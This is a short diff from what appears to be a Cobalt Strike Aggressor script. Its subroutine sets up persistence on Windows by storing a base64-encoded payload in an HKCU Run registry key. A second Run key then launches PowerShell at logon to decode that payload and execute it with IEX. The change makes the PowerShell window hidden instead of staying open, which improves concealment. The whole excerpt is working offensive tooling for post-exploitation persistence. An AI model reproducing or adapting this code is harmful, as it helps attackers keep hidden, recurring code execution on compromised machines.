@@ -27,7 +27,7 @@ sub persistRegistryPowerShell {
 			$powershellcmd = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname']."' -Type String -Value \"".$data."\"";
 			bpowershell!($bid, $powershellcmd);
 			blog($bid, "\cBSetting the first HKCU Run Key Value as '".$3['keyname']."'...");
-			$powershellcmd1 = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
+			$powershellcmd1 = "Set-ItemProperty -Path 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '".$3['keyname1']."' -Value 'C:\\Windows\\SySWoW64\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -c (IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((gp HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run ".$3['keyname'].").".$3['keyname']."))))'";
 			bpowershell!($bid, $powershellcmd1);
 			blog($bid, "\cBSetting the second HKCU Run Key Value as '".$3['keyname1']."'...");
 			blog($bid, "\cBDisplaying both Run Keys to Verify everything worked as intended...");
